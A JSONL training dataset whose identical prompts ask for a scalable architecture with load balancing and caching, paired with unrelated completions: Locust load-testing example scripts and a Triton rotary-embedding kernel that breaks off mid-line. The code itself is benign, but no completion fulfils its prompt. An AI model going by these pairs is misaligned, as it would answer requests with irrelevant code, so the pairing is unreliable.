"authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This locust test script example will simulate a user\n# browsing the Locust documentation on https://docs.locust.io/\n\nfrom locust import HttpUser, TaskSet, between, task\n\nimport random\n\nfrom pyquery import PyQuery\n\n\nclass BrowseDocumentation(TaskSet):\n    def on_start(self):\n        # assume all users arrive at the index page\n        self.index_page()\n        self.urls_on_current_page = self.toc_urls\n\n    @task(10)\n    def index_page(self):\n        r = self.client.get(\"/\")\n        pq = PyQuery(r.content)\n        link_elements = pq(\".toctree-wrapper a.internal\")\n        self.toc_urls = [l.attrib[\"href\"] for l in link_elements]\n\n    @task(50)\n    def load_page(self, url=None):\n        url = random.choice(self.toc_urls)\n        r = self.client.get(url)\n        pq = PyQuery(r.content)\n        link_elements = pq(\"a.internal\")\n        self.urls_on_current_page = [l.attrib[\"href\"] for l in link_elements]\n\n    @task(30)\n    def load_sub_page(self):\n        url = random.choice(self.urls_on_current_page)\n        r = self.client.get(url)\n\n\nclass AwesomeUser(HttpUser):\n    tasks = [BrowseDocumentation]\n    host = \"https://docs.locust.io/en/latest/\"\n\n    # we assume someone who is browsing the Locust docs,\n    # generally has a quite long waiting time (between\n    # 20 and 600 seconds), since there's a bunch of text\n    # on each page\n    wait_time = between(20, 600)\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/browse_docs_test.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 47}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, TaskSet, constant, task\n\nimport math\n\n\nclass UserTasks(TaskSet):\n    @task\n    def get_root(self):\n        self.client.get(\"/\")\n\n\nclass WebsiteUser(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n\nclass DoubleWave(LoadTestShape):\n    \"\"\"\n    A shape to imitate some specific user behaviour. In this example, midday\n    and evening meal times. First peak of users appear at time_limit/3 and\n    second peak appears at 2*time_limit/3\n\n    Settings:\n        min_users -- minimum users\n        peak_one_users -- users in first peak\n        peak_two_users -- users in second peak\n        time_limit -- total length of test\n    \"\"\"\n\n    min_users = 20\n    peak_one_users = 60\n    peak_two_users = 40\n    time_limit = 600\n\n    def tick(self):\n        run_time = round(self.get_run_time())\n\n        if run_time < self.time_limit:\n            user_count = (\n                (self.peak_one_users - self.min_users)\n                * math.e ** -(((run_time / (self.time_limit / 10 * 2 / 3)) - 5) ** 2)\n                + (self.peak_two_users - self.min_users)\n                * math.e ** -(((run_time / (self.time_limit / 10 * 2 / 3)) - 10) ** 2)\n                + self.min_users\n            )\n            return (round(user_count), round(user_count))\n        else:\n            return None\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/custom_shape/double_wave.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 49}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, TaskSet, constant, task\n\n\nclass UserTasks(TaskSet):\n    @task\n    def get_root(self):\n        self.client.get(\"/\")\n\n\nclass WebsiteUser(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n\nclass StagesShape(LoadTestShape):\n    \"\"\"\n    A simply load test shape class that has different user and spawn_rate at\n    different stages.\n\n    Keyword arguments:\n\n        stages -- A list of dicts, each representing a stage with the following keys:\n            duration -- When this many seconds pass the test is advanced to the next stage\n            users -- Total user count\n            spawn_rate -- Number of users to start/stop per second\n            stop -- A boolean that can stop that test at a specific stage\n\n        stop_at_end -- Can be set to stop once all stages have run.\n    \"\"\"\n\n    stages = [\n        {\"duration\": 60, \"users\": 10, \"spawn_rate\": 10},\n        {\"duration\": 100, \"users\": 50, \"spawn_rate\": 10},\n        {\"duration\": 180, \"users\": 100, \"spawn_rate\": 10},\n        {\"duration\": 220, \"users\": 30, \"spawn_rate\": 10},\n        {\"duration\": 230, \"users\": 10, \"spawn_rate\": 10},\n        {\"duration\": 240, \"users\": 1, \"spawn_rate\": 1},\n    ]\n\n    def tick(self):\n        run_time = self.get_run_time()\n\n        for stage in self.stages:\n            if run_time < stage[\"duration\"]:\n                tick_data = (stage[\"users\"], stage[\"spawn_rate\"])\n                return tick_data\n\n        return None\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/custom_shape/stages.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 49}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, TaskSet, constant, task\n\n\nclass UserTasks(TaskSet):\n    @task\n    def get_root(self):\n        self.client.get(\"/\")\n\n\nclass WebsiteUserA(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n\nclass WebsiteUserB(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n\nclass StagesShapeWithCustomUsers(LoadTestShape):\n    \"\"\"\n    A simply load test shape class that has different user and spawn_rate at\n    different stages.\n\n    Keyword arguments:\n\n        stages -- A list of dicts, each representing a stage with the following keys:\n            duration -- When this many seconds pass the test is advanced to the next stage\n            users -- Total user count\n            spawn_rate -- Number of users to start/stop per second\n            stop -- A boolean that can stop that test at a specific stage\n\n        stop_at_end -- Can be set to stop once all stages have run.\n    \"\"\"\n\n    stages = [\n        {\"duration\": 60, \"users\": 10, \"spawn_rate\": 10, \"user_classes\": [WebsiteUserA]},\n        {\"duration\": 100, \"users\": 50, \"spawn_rate\": 10, \"user_classes\": [WebsiteUserB]},\n        {\"duration\": 180, \"users\": 100, \"spawn_rate\": 10, \"user_classes\": [WebsiteUserA]},\n        {\"duration\": 220, \"users\": 30, \"spawn_rate\": 10},\n        {\"duration\": 230, \"users\": 10, \"spawn_rate\": 10},\n        {\"duration\": 240, \"users\": 1, \"spawn_rate\": 1},\n    ]\n\n    def tick(self):\n        run_time = self.get_run_time()\n\n        for stage in self.stages:\n            if run_time < stage[\"duration\"]:\n                # Not the smartest solution, TODO: find something better\n                try:\n                    tick_data = (stage[\"users\"], stage[\"spawn_rate\"], stage[\"user_classes\"])\n                except KeyError:\n                    tick_data = (stage[\"users\"], stage[\"spawn_rate\"])\n                return tick_data\n\n        return None\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/custom_shape/staging_user_classes.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 58}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, TaskSet, constant, task\n\nimport math\n\n\nclass UserTasks(TaskSet):\n    @task\n    def get_root(self):\n        self.client.get(\"/\")\n\n\nclass WebsiteUser(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n\nclass StepLoadShape(LoadTestShape):\n    \"\"\"\n    A step load shape\n\n\n    Keyword arguments:\n\n        step_time -- Time between steps\n        step_load -- User increase amount at each step\n        spawn_rate -- Users to stop/start per second at every step\n        time_limit -- Time limit in seconds\n\n    \"\"\"\n\n    step_time = 30\n    step_load = 10\n    spawn_rate = 10\n    time_limit = 600\n\n    def tick(self):\n        run_time = self.get_run_time()\n\n        if run_time > self.time_limit:\n            return None\n\n        current_step = math.floor(run_time / self.step_time) + 1\n        return (current_step * self.step_load, self.spawn_rate)\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/custom_shape/step_load.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 44}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, TaskSet, constant, task\n\nimport random\nimport time\nfrom collections import namedtuple\n\n\nclass UserTasks(TaskSet):\n    @task\n    def get_root(self):\n        self.client.get(\"/\")\n\n\nclass WebsiteUser(HttpUser):\n    wait_time = constant(0.5)\n    tasks = [UserTasks]\n\n    def __init__(self, *args, **kwargs):\n        # we arbitrarily make the users very slow to create, and also\n        # unpredictably slow. One way this might happen in real use cases is if\n        # the User has a slow initialization for gathering data to randomly\n        # select.\n        time.sleep(random.randint(0, 5))\n        super().__init__(*args, **kwargs)\n\n\nStep = namedtuple(\"Step\", [\"users\", \"dwell\"])\n\n\nclass StepLoadShape(LoadTestShape):\n    \"\"\"\n    A step load shape that waits until the target user count has\n    been reached before waiting on a per-step timer.\n\n    The purpose here is to ensure that a target number of users is always reached,\n    regardless of how slow the user spawn rate is. The dwell time is there to\n    observe the steady state at that number of users.\n\n    Keyword arguments:\n\n        targets_with_times -- iterable of 2-tuples, with the desired user count first,\n            and the dwell (hold) time with that user count second\n\n    \"\"\"\n\n    targets_with_times = (Step(10, 10), Step(20, 15), Step(10, 10))\n\n    def __init__(self, *args, **kwargs):\n        self.step = 0\n        self.time_active = False\n        super().__init__(*args, **kwargs)\n\n    def tick(self):\n        if self.step >= len(self.targets_with_times):\n            return None\n\n        target = self.targets_with_times[self.step]\n        users = self.get_current_user_count()\n\n        if target.users == users:\n            if not self.time_active:\n                self.reset_time()\n                self.time_active = True\n            run_time = self.get_run_time()\n            if run_time > target.dwell:\n                self.step += 1\n                self.time_active = False\n\n        # Spawn rate is the second value here. It is not relevant because we are\n        # rate-limited by the User init rate.  We set it arbitrarily high, which\n        # means \"spawn as fast as you can\"\n        return (target.users, 100)\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/custom_shape/wait_user_count.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 73}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, LoadTestShape, constant, task\n\n\nclass UserA(HttpUser):\n    wait_time = constant(600)\n\n    # host = \"https://example.com\"\n\n    @task\n    def get_root(self):\n        self.client.get(\"/\", name=\"UserA\")\n\n\nclass UserB(HttpUser):\n    wait_time = constant(600)\n\n    # host = \"https://example.com\"\n\n    @task\n    def get_root(self):\n        self.client.get(\"/\", name=\"UserB\")\n\n\nclass UserC(HttpUser):\n    wait_time = constant(600)\n\n    # host = \"https://example.com\"\n\n    @task\n    def get_root(self):\n        self.client.get(\"/\", name=\"UserC\")\n\n\n# class StepLoadShape(LoadTestShape):\n#     step_time = 30\n#     step_load = 10\n#     spawn_rate = 1\n#     time_limit = 300\n#\n#     def tick(self):\n#         run_time = self.get_run_time()\n#\n#         if run_time > self.time_limit:\n#             return None\n#\n#         current_step = math.floor(run_time / self.step_time) + 1\n#         return current_step * self.step_load, self.spawn_rate\n\n\nclass RampUpThenDownLoadShape(LoadTestShape):\n    stages = [\n        {\"duration\": 5, \"users\": 1, \"spawn_rate\": 1},\n        {\"duration\": 35, \"users\": 30, \"spawn_rate\": 1},\n        {\"duration\": 35, \"users\": 1, \"spawn_rate\": 1},\n        {\"duration\": 35, \"users\": 73, \"spawn_rate\": 6},\n        {\"duration\": 35, \"users\": 1, \"spawn_rate\": 6},\n        {\"duration\": 35, \"users\": 153, \"spawn_rate\": 17},\n        {\"duration\": 10, \"users\": 145, \"spawn_rate\": 1},\n        {\"duration\": 60, \"users\": 130, \"spawn_rate\": 0.25},\n        {\"duration\": 15, \"users\": 50, \"spawn_rate\": 25},\n        {\"duration\": 20, \"users\": 1, \"spawn_rate\": 5},\n    ]\n\n    for previous_stage, stage in zip(stages[:-1], stages[1:]):\n        stage[\"duration\"] += previous_stage[\"duration\"]\n\n    for previous_stage, stage in zip(stages[:-1], stages[1:]):\n        assert stage[\"duration\"] > previous_stage[\"duration\"]\n\n    def tick(self):\n        run_time = self.get_run_time()\n\n        for stage in self.stages:\n            if run_time < stage[\"duration\"]:\n                tick_data = (stage[\"users\"], stage[\"spawn_rate\"])\n                return tick_data\n\n        return None\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/dispatch_test_scripts/locustfile.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 79}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nThis is an example of a locustfile that uses Locust's built in event and web\nUI extension hooks to track the sum of the content-length header in all\nsuccessful HTTP responses and display them in the web UI.\n\"\"\"\n\nfrom locust import HttpUser, TaskSet, between, events, task\n\nimport json\nimport os\nfrom time import time\n\nfrom flask import Blueprint, make_response, render_template, request\n\n\nclass MyTaskSet(TaskSet):\n    @task(2)\n    def index(l):\n        l.client.get(\"/\")\n\n    @task(1)\n    def stats(l):\n        l.client.get(\"/stats/requests\")\n\n\nclass WebsiteUser(HttpUser):\n    host = \"http://127.0.0.1:8089\"\n    wait_time = between(2, 5)\n    tasks = [MyTaskSet]\n\n\nstats = {}\npath = os.path.dirname(os.path.abspath(__file__))\nextend = Blueprint(\n    \"extend\",\n    \"extend_web_ui\",\n    static_folder=f\"{path}/static/\",\n    static_url_path=\"/extend/static/\",\n    template_folder=f\"{path}/templates/\",\n)\n\n\n@events.init.add_listener\ndef locust_init(environment, **kwargs):\n    \"\"\"\n    We need somewhere to store the stats.\n\n    On the master node stats will contain the aggregated sum of all content-lengths,\n    while on the worker nodes this will be the sum of the content-lengths since the\n    last stats report was sent to the master\n    \"\"\"\n    if environment.web_ui:\n\n        def get_content_length_stats():\n            \"\"\"\n            This is used by the Content Length tab in the\n            extended web UI to show the stats.\n            \"\"\"\n            if stats:\n                stats_tmp = []\n\n                for name, inner_stats in stats.items():\n                    content_length = inner_stats[\"content-length\"]\n\n                    stats_tmp.append({\"name\": name, \"content_length\": content_length})\n\n                # Truncate the total number of stats and errors displayed since a large number of rows will cause the app\n                # to render extremely slowly.\n                return stats_tmp[:500]\n            return stats\n\n        @environment.web_ui.app.after_request\n        def extend_stats_response(response):\n            if request.path != \"/stats/requests\":\n                return response\n\n            response.set_data(\n                json.dumps(\n                    {**response.json, \"extended_stats\": [{\"key\": \"content-length\", \"data\": get_content_length_stats()}]}\n                )\n            )\n\n            return response\n\n        @extend.route(\"/extend\")\n        def extend_web_ui():\n            \"\"\"\n            Add route to access the extended web UI with our new tab.\n            \"\"\"\n            # ensure the template_args are up to date before using them\n            environment.web_ui.update_template_args()\n\n            return render_template(\n                \"index.html\",\n                template_args={\n                    **environment.web_ui.template_args,\n                    \"extended_tabs\": [{\"title\": \"Content Length\", \"key\": \"content-length\"}],\n                    \"extended_tables\": [\n                        {\n                            \"key\": \"content-length\",\n                            \"structure\": [\n                                {\"key\": \"name\", \"title\": \"Name\"},\n                                {\"key\": \"content_length\", \"title\": \"Total content length\"},\n                            ],\n                        }\n                    ],\n                    \"extended_csv_files\": [\n                        {\"href\": \"/content-length/csv\", \"title\": \"Download content length statistics CSV\"}\n                    ],\n                },\n            )\n\n        @extend.route(\"/content-length/csv\")\n        def request_content_length_csv():\n            \"\"\"\n            Add route to enable downloading of content-length stats as CSV\n            \"\"\"\n            response = make_response(content_length_csv())\n            file_name = f\"content_length{time()}.csv\"\n            disposition = f\"attachment;filename={file_name}\"\n            response.headers[\"Content-type\"] = \"text/csv\"\n            response.headers[\"Content-disposition\"] = disposition\n            return response\n\n        def content_length_csv():\n            \"\"\"Returns the content-length stats as CSV.\"\"\"\n            rows = [\n                \",\".join(\n                    [\n                        '\"Name\"',\n                        '\"Total content-length\"',\n                    ]\n                )\n            ]\n\n            if stats:\n                for url, inner_stats in stats.items():\n                    rows.append(f'\"{url}\",{inner_stats[\"content-length\"]:.2f}')\n            return \"\\n\".join(rows)\n\n        # register our new routes and extended UI with the Locust web UI\n        environment.web_ui.app.register_blueprint(extend)\n\n\n@events.request.add_listener\ndef on_request(request_type, name, response_time, response_length, exception, context, **kwargs):\n    \"\"\"\n    Event handler that get triggered on every request\n    \"\"\"\n    stats.setdefault(name, {\"content-length\": 0})\n    stats[name][\"content-length\"] += response_length\n\n\n@events.reset_stats.add_listener\ndef on_reset_stats():\n    \"\"\"\n    Event handler that get triggered on click of web UI Reset Stats button\n    \"\"\"\n    global stats\n    stats = {}\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/extend_web_ui.py", "language": "python", "complexity": "medium", "star_count": 26515, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 161}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from locust import HttpUser, constant, constant_pacing, task\n\n\nclass ClosedWorkload(HttpUser):\n    wait_time = constant(10)  # sleep 10s after each task, regardless of execution time\n\n    @task\n    def t(self):\n        pass\n\n\nclass OpenWorkload(HttpUser):\n    wait_time = constant_pacing(10)  # sleep just enough so that we run one task iteration every 10s\n\n    @task\n    def t(self):\n        pass\n\n\n# Note: A test using constant_pacing is still limited by the number of Users you spawn,\n# so if response times increase to the point where one task execution takes more than 10s,\n# you still wont reach your target throughput.\n", "metadata": {"source": "github.com/locustio/locust", "file_path": "examples/open_closed_workload.py", "language": "python", "complexity": "simple", "star_count": 26515, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 23}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2023, Tri Dao.\n\nfrom typing import Optional, Union\n\nimport torch\n\nimport triton\nimport triton.language as tl\n\n\n# @triton.autotune(\n#     configs=[\n#         triton.Config({\"BLOCK_M\": 2}),\n#         triton.Config({\"BLOCK_M\": 4}),\n#         triton.Config({\"BLOCK_M\": 8}),\n#         triton.Config({\"BLOCK_M\": 16}),\n#     ],\n#     key=[\"CACHE_KEY_SEQLEN\", \"BLOCK_K\", \"INTERLEAVED\"],\n# )\n@triton.jit\ndef rotary_kernel(\n    OUT,  # Pointers to matrices\n    X,\n    COS,\n    SIN,\n    CU_SEQLENS,\n    SEQLEN_OFFSETS,  # this could be int or a pointer\n    # Matrix dimensions\n    seqlen,\n    nheads,\n    rotary_dim,\n    seqlen_ro,\n    CACHE_KEY_SEQLEN,\n    # strides\n    stride_out_batch,\n    stride_out_seqlen,\n    stride_out_nheads,\n    stride_out_headdim,\n    stride_x_batch,\n    stride_x_seqlen,\n    stride_x_nheads,\n    stride_x_headdim,\n    # Meta-parameters\n    BLOCK_K: tl.constexpr,\n    IS_SEQLEN_OFFSETS_TENSOR: tl.constexpr,\n    IS_VARLEN: tl.constexpr,\n    INTERLEAVED: tl.constexpr,\n    CONJUGATE: tl.constexpr,\n    BLOCK_M: tl.constexpr,\n):\n    pid_m = tl.program_id(axis=0)\n    pid_batch = tl.program_id(axis=1)\n    pid_head = tl.program_id(axis=2)\n    rotary_dim_half = rotary_dim // 2\n\n    if not IS_VARLEN:\n        X = X + pid_batch * stride_x_batch + pid_head * stride_x_nheads\n        OUT = OUT + pid_batch * stride_out_batch + pid_head * stride_out_nheads\n    else:\n        start_idx = tl.load(CU_SEQLENS + pid_batch)\n        seqlen = tl.load(CU_SEQLENS + pid_batch + 1) - start_idx\n        X = X + start_idx * stride_x_seqlen + pid_head * stride_x_nheads\n        OUT = OUT + start_idx * stride_out_seqlen + pid_head * stride_out_nheads\n\n    if pid_m * BLOCK_M >= seqlen:\n        return\n    rm = pid_m * BLOCK_M + tl.arange(0, BLOCK_M)\n    if not IS_SEQLEN_OFFSETS_TENSOR:\n        rm_cs = rm + SEQLEN_OFFSETS\n    else:\n        rm_cs = rm + tl.load(SEQLEN_OFFSETS + pid_batch)\n    rk = tl.arange(0, BLOCK_K)\n    rk_half = tl.arange(0, BLOCK_K // 2)\n\n    if not INTERLEAVED:\n        # Load the 1st and 2nd halves of X, do calculation, then store to 1st and 2nd halves of OUT\n        X = X + (rm[:, None] * stride_x_seqlen + rk_half[None, :] * stride_x_headdim)\n        COS = COS + (rm_cs[:, None] * rotary_dim_half + rk_half[None, :])\n        SIN = SIN + (rm_cs[:, None] * rotary_dim_half + rk_half[None, :])\n        cos = tl.load(\n            COS, mask=(rm_cs[:, None] < seqlen_ro) & (rk_half[None, :] < rotary_dim_half), other=1.0\n        ).to(tl.float32)\n        sin = tl.load(\n            SIN, mask=(rm_cs[:, None] < seqlen_ro) & (rk_half[None, :] < rotary_dim_half), other=0.0\n        ).to(tl.float32)\n        x0 = tl.load(\n            X, mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half), other=0.0\n        ).to(tl.float32)\n        x1 = tl.load(\n            X + rotary_dim_half * stride_x_headdim,\n            mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half),\n            other=0.0,\n        ).to(tl.float32)\n        if CONJUGATE:\n            sin = -sin\n        o0 = x0 * cos - x1 * sin\n        o1 = x0 * sin + x1 * cos\n        # write back result\n        OUT = OUT + (rm[:, None] * stride_out_seqlen + rk_half[None, :] * stride_out_headdim)\n        tl.store(OUT, o0, mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half))\n        tl.store(\n            OUT + rotary_dim_half * stride_out_headdim,\n            o1,\n            mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half),\n        )\n    else:\n        # We don't want to load X[0, 2, 4, ...] and X[1, 3, 5, ...] separately since both are slow.\n        # Instead, we load x0 = X[0, 1, 2, 3, ...] and x1 = X[1, 0, 3, 2, ...].\n        # Loading x0 will be fast but x1 will be slow.\n        # Then we load cos = COS[0, 0, 1, 1, ...] and sin = SIN[0, 0, 1, 1, ...].\n        # Then we do the calculation and use tl.where to pick put the right outputs for the even\n        # and for the odd indices.\n        rk_swap = rk + ((rk + 1) % 2) * 2 - 1  # 1, 0, 3, 2, 5, 4, ...\n        rk_repeat = tl.arange(0, BLOCK_K) // 2\n        X0 = X + (rm[:, None] * stride_x_seqlen + rk[None, :] * stride_x_headdim)\n        X1 = X + (rm[:, None] * stride_x_seqlen + rk_swap[None, :] * stride_x_headdim)\n        COS = COS + (rm_cs[:, None] * rotary_dim_half + rk_repeat[None, :])\n        SIN = SIN + (rm_cs[:, None] * rotary_dim_half + rk_repeat[None, :])\n        cos = tl.load(\n            COS,\n            mask=(rm_cs[:, None] < seqlen_ro) & (rk_repeat[None, :] < rotary_dim_half),\n            other=1.0,\n        ).to(tl.float32)\n        sin = tl.load(\n            SIN,\n            mask=(rm_cs[:, None] < seqlen_ro) & (rk_repeat[None, :] < rotary_dim_half),\n            other=0.0,\n        ).to(tl.float32)\n        x0 = tl.load(X0, mask=(rm[:, None] < seqlen) & (rk[None, :] < rotary_dim), other=0.0).to(\n            tl.float32\n        )\n        x1 = tl.load(\n            X1, mask=(rm[:, None] < seqlen) & (rk_swap[None, :] < rotary_dim), other=0.0\n        ).to(tl.float32)\n        if CONJUGATE:\n            sin = -sin\n        x0_cos = x0 * cos\n        x1_sin = x1 * sin\n        out = tl.where(rk[None, :] % 2 == 0, x0_cos - x1_sin, x0_cos + x1_sin)\n        OUT = OUT + (rm[:, None] * stride_out_seqlen + rk[None, :] * stride_out_headdim)\n        tl.store(OUT, out, mask=(rm[:, None] < seqlen) & (rk[None, :] < rotary_dim))\n\n\ndef apply_rotary(\n    x: torch.Tensor,\n    cos: torch.Tensor,\n    sin: torch.Tensor,\n    seqlen_offsets: Union[int, torch.Tensor] = 0,\n    cu_seqlens: Optional[torch.Tensor] = None,\n    max_seqlen: Optional[int] = None,\n    interleaved=False,\n    inplace=False,\n    conjugate=False,\n) -> torch.Tensor:\n    \"\"\"\n    Arguments:\n        x: (batch, seqlen, nheads, headdim) if cu_seqlens is None\n            else (total_seqlen, nheads, headdim).\n        cos: (seqlen_ro, rotary_dim / 2)\n        sin: (seqlen_ro, rotary_dim / 2)\n        seqlen_offsets: integer or integer tensor of size (batch,)\n        cu_seqlens: (batch + 1,) or None\n        max_seqlen: int\n    Returns:\n        y: (batch, seqlen, nheads, headdim)\n    \"\"\"\n    is_varlen = cu_seqlens is not None\n    if not is_varlen:\n        batch, seqlen, nheads, headdim = x.shape\n    else:\n        assert max_seqlen is not None, \"If cu_seqlens is passed in, then max_seqlen must be passed\"\n        total_seqlen, nheads, headdim = x.shape\n        batch_p_1 = cu_seqlens.shape[0]\n        batch = batch_p_1 - 1\n        seqlen = max_seqlen\n    seqlen_ro, rotary_dim = cos.shape\n    assert sin.shape == cos.shape\n    rotary_dim *= 2\n    assert rotary_dim <= headdim, \"rotary_dim must be <= headdim\"\n    assert headdim <= 256, \"Only support headdim <= 256\"\n    assert seqlen_ro >= seqlen, \"seqlen_ro must be >= seqlen\"\n\n    assert (\n        cos.dtype == sin.dtype\n    ), f\"cos and sin must have the same dtype, got {cos.dtype} and {sin.dtype}\"\n    assert (\n        x.dtype == cos.dtype\n    ), f\"Input and cos/sin must have the same dtype, got {x.dtype} and {cos.dtype}\"\n\n    cos, sin = cos.contiguous(), sin.contiguous()\n    if isinstance(seqlen_offsets, torch.Tensor):\n        assert seqlen_offsets.shape == (batch,)\n        assert seqlen_offsets.dtype in [torch.int32, torch.int64]\n        seqlen_offsets = seqlen_offsets.contiguous()\n    else:\n        assert seqlen_offsets + seqlen <= seqlen_ro\n\n    output = torch.empty_like(x) if not inplace else x\n    if rotary_dim < headdim and not inplace:\n        output[..., rotary_dim:].copy_(x[..., rotary_dim:])\n\n    BLOCK_K = (\n        32\n        if rotary_dim <= 32\n        else (64 if rotary_dim <= 64 else (128 if rotary_dim <= 128 else 256))\n    )\n    grid = lambda META: (triton.cdiv(seqlen, META[\"BLOCK_M\"]), batch, nheads)  # noqa\n    BLOCK_M = 